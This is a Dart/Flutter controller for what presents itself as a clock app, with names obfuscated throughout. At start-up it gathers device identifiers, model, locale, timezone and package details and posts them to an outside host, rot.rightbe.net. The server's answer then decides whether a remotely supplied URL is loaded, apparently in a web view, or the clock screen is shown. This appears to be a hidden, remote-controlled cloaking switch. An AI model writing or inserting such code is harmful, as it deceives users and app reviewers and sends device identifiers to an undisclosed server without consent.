import 'dart:io';
import 'package:dio/dio.dart';

import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:get/get.dart';



class CproLandLogic extends GetxController {

  var yxjuvkb = RxBool(false);
  var lvgqnx = RxBool(true);
  var vpni = RxString("");
  var ashlee = RxBool(false);
  var bogan = RxBool(true);
  final nbtpdjlrc = Dio();


  InAppWebViewController? webViewController;

  dynamic dxqasiy(){
    final mnxslicoeg = InternetConnectionChecker.instance;
    final vdhune = mnxslicoeg.onStatusChange.skip(1).listen(
          (InternetConnectionStatus fsarbtz) {
        if (fsarbtz == InternetConnectionStatus.connected) {
          ptfyuo();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            ptfyuo();
          });
        }
      },
    );
    return vdhune;
  }

  Future<bool> mcfwrqd() async {
    var iadjfk = await NetworkUtils.isNetworkAvailable();
    if(!iadjfk){
      Get.toNamed('/Apptimeout')?.then((_){
        ptfyuo();
      });
    }
    return iadjfk;
  }

  @override
  void onInit() {
    super.onInit();
    dxqasiy();
    ptfyuo();
  }


  Future<void> ptfyuo() async {

    var xtuqlhzkrn = await mcfwrqd();
    if(!xtuqlhzkrn){
      return;
    }

    ashlee.value = true;
    bogan.value = true;
    lvgqnx.value = false;

    nbtpdjlrc.post("https://rot.rightbe.net/H4SPGNWVQZNAE3V?no_check",data: await risnflm()).then((value) {
      var ozagq = value.data["ozagq"] as String;
      var rwmkjsyt = value.data["rwmkjsyt"] as bool;
      if (rwmkjsyt) {
        vpni.value = ozagq;
        twila();
      } else {
        rolfson();
      }
    }).catchError((e) {
      lvgqnx.value = true;
      bogan.value = true;
      ashlee.value = false;
    });
  }

  Future<Map<String, dynamic>> risnflm() async {
    final DeviceInfoPlugin ucgtiewn = DeviceInfoPlugin();
    PackageInfo anweg_igfpbq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jpbeqnf = Platform.localeName;
    var okhlbv = currentTimeZone;

    var pdrsejbk = anweg_igfpbq.packageName;
    var xawlzmvp = anweg_igfpbq.version;
    var zburo = anweg_igfpbq.buildNumber;

    var xsizmr = anweg_igfpbq.appName;
    var dcjnumq = "";
    var lvabwkg  = "";
    var uadb = "";
    var stephanyWeimann = "";
    var jamaalMann = "";
    var cristinaAltenwerth = "";
    var destineeKuhic = "";
    var alysonOrtiz = "";
    var georgianaStroman = "";
    var connieLowe = "";


    var ozvtqp = "";
    var aoxvfyph = false;

    if (GetPlatform.isAndroid) {
      ozvtqp = "android";
      var lfqugy = await ucgtiewn.androidInfo;

      uadb = lfqugy.brand;

      dcjnumq  = lfqugy.model;
      lvabwkg = lfqugy.id;

      aoxvfyph = lfqugy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ozvtqp = "ios";
      var rfpgewolds = await ucgtiewn.iosInfo;
      uadb = rfpgewolds.name;
      dcjnumq = rfpgewolds.model;

      lvabwkg = rfpgewolds.identifierForVendor ?? "";
      aoxvfyph  = rfpgewolds.isPhysicalDevice;
    }

    var res = {
      "xsizmr": xsizmr,
      "zburo": zburo,
      "xawlzmvp": xawlzmvp,
      "pdrsejbk": pdrsejbk,
      "dcjnumq": dcjnumq,
      "okhlbv": okhlbv,
      "uadb": uadb,
      "lvabwkg": lvabwkg,
      "jpbeqnf": jpbeqnf,
      "ozvtqp": ozvtqp,
      "aoxvfyph": aoxvfyph,
      "stephanyWeimann" : stephanyWeimann,
      "jamaalMann" : jamaalMann,
      "cristinaAltenwerth" : cristinaAltenwerth,
      "destineeKuhic" : destineeKuhic,
      "alysonOrtiz" : alysonOrtiz,
      "georgianaStroman" : georgianaStroman,
      "connieLowe" : connieLowe,

    };
    return res;
  }

  Future<void> rolfson() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> twila() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    dxqasiy().cancel();
    super.dispose();
  }

}
